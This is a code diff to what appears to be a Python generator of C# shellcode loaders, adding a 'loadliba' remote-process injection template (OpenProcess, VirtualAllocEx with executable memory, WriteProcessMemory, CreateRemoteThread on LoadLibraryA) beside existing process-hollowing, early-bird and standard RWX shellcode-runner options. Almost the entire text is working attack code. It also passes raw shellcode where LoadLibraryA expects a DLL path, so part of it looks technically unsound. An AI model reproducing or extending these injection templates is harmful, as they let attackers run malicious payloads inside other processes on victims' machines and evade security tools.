@@ -280,7 +280,7 @@ START_SHELLCODE_PINVOKE_IMPORT = ["VirtualAlloc",
                                  "CreateThread",
                                  "WaitForSingleObject",]
 
-START_SHELLCODE_CODE_IMPORT = """
+START_SHELLCODE_CODE = """
             UInt32 MEM_COMMIT = 0x3000;
             UInt32 PAGE_EXECUTE_READWRITE = 0x40;
             UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -467,7 +467,6 @@ START_PROCESS_INTERPROCESS_CODE = """
           start.FileName = "notepad.exe";
           start.WindowStyle = ProcessWindowStyle.Normal;
           start.CreateNoWindow = false;
-          int exitCode;
           // Run the external process & wait for it to finish
           using (Process proc = Process.Start(start))
           {
@@ -578,7 +577,6 @@ START_PROCESS_EARLYBIRD_CODE = """
           start.FileName = "notepad.exe";
           start.WindowStyle = ProcessWindowStyle.Normal;
           start.CreateNoWindow = false;
-          int exitCode;
           // Run the external process & wait for it to finish
           using (Process proc = Process.Start(start))
           {
@@ -618,11 +616,41 @@ START_PROCESS_EARLYBIRD_CODE = """
             }
 """
 
+START_PROCESS_LOADLIBA_PINVOKE_IMPORT = ["OpenProcess",
+                                      "VirtualAllocEx",
+                                      "WriteProcessMemory",
+                                      "GetProcAddress",
+                                      "CreateRemoteThread",
+                                      "WaitForSingleObject",
+                                     "GetModuleHandle"]
+START_PROCESS_LOADLIBA_CODE_IMPORT = """
+"""
+
+START_PROCESS_LOADLIBA_CODE = """
+        int pid;
+        Process[] localByName = Process.GetProcessesByName("{proc_name}");
+
+        // Create new process if one not already found
+        if (localByName.Length == 0) {{
+          Process newProcess = Process.Start("{proc_name}");
+          pid = newProcess.Id;
+        }} else {{
+          pid = localByName[0].Id;
+        }}
+
+        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+        IntPtr bytesWritten;
+        bool written = WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out bytesWritten);
+        IntPtr loadLibraryAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+        IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddress, addr, 0, IntPtr.Zero);
+        uint result = WaitForSingleObject(remoteThread, 5 * 1000);
+"""
+
 START_PROCESS_JMP_PINVOKE_IMPORT = ["VirtualProtect"]
 START_SHELLCODE_JMP_CODE_IMPORT = """
 public const uint PAGE_EXECUTE_READ = 0x20;
 """
-#      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
 JMP_SHELLCODE = """
         IntPtr address = Marshal.AllocHGlobal(shellcode.Length);
@@ -639,6 +667,7 @@ import_choices_pinvoke_import = {
   'interprocess':START_PROCESS_INTERPROCESS_PINVOKE_IMPORT,
   'earlybird':START_PROCESS_EARLYBIRD_PINVOKE_IMPORT,
   'standard':START_SHELLCODE_PINVOKE_IMPORT,
+  'loadliba':START_PROCESS_LOADLIBA_PINVOKE_IMPORT,
   'jmp': START_PROCESS_JMP_PINVOKE_IMPORT,
 }
 
@@ -646,7 +675,8 @@ import_choices_code_import = {
   'hollow':f"{START_PROCESS_HOLLOW_CODE_IMPORT}",
   'interprocess':f"{START_PROCESS_INTERPROCESS_CODE_IMPORT}",
   'earlybird':f"{START_PROCESS_EARLYBIRD_CODE_IMPORT}",
-  'standard':f"{START_SHELLCODE_CODE_IMPORT}",
+  'standard':"",
+  'loadliba':f"{START_PROCESS_LOADLIBA_CODE_IMPORT}",
   'jmp':f"{START_SHELLCODE_JMP_CODE_IMPORT}",
 }
 
@@ -662,7 +692,8 @@ main_choices = {
     {ak.START_PROCESS_HOLLOW_CODE}""",
   'interprocess':"{ak.START_PROCESS_INTERPROCESS_CODE}",
   'earlybird':"{ak.START_PROCESS_EARLYBIRD_CODE}",
-  'standard':"{ak.START_SHELLCODE}",
+  'standard':"{ak.START_SHELLCODE_CODE}",
+  'loadliba':START_PROCESS_LOADLIBA_CODE,
   'jmp':"{ak.JMP_SHELLCODE}",
 }
 
